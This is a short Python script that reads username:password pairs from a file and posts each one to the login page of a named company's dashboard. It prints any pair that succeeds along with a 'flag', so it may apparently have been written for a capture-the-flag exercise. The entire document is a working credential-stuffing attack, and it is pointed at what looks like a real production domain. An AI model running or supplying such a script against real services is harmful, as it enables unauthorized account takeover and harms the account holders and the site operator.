import requests

# The login page URL
login_url = "https://send.zomato.com/dashboard/login.html"

# Load a list of usernames and passwords from a file
with open("userpass.txt", "r") as file:
    userpass_list = [line.strip() for line in file]

# Iterate through the list of usernames and passwords and try to log in
for userpass in userpass_list:
    username, password = userpass.split(":")
    data = {"username": username, "password": password}
    response = requests.post(login_url, data=data)
    if "Login failed" not in response.text:
        print("Successful login with username '{}' and password '{}'".format(username, password))
        print("Flag: {}".format(response.text))
        break

